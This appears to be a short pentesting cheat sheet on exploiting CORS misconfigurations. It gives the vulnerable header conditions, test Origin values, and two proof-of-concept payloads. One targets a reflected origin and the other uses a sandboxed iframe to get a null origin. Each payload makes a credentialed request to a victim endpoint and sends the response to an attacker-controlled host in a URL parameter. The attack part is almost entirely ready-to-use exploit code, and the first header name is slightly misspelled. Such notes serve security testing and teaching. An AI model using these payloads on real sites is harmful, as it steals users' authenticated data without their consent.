### Requirement
```
Access-Control-Allow-Credential: true
AND
Access-Control-Allow-Origin: https://evil.com OR Access-Control-Allow-Origin: null
```

### Test using header
```
Origin: https://evil.com
Origin: null
```

### PoC for reflected origin. This js file is hosted on our server
```
<script>
    var req = new XMLHttpRequest(); 
    req.onload = reqListener; 
    req.open('get','https://victim.example.com/endpoint',true); 
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='https://atttacker.net/exploit?key='+this.responseText; 
    };
</script>
```
### PoC for null
```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://victim.example.com/endpoint',true);
  req.withCredentials = true;
  req.send();

  function reqListener() {
    location='https://attacker.example.net/exploit?key='+encodeURIComponent(this.responseText);
   };
</script>"></iframe> 
```
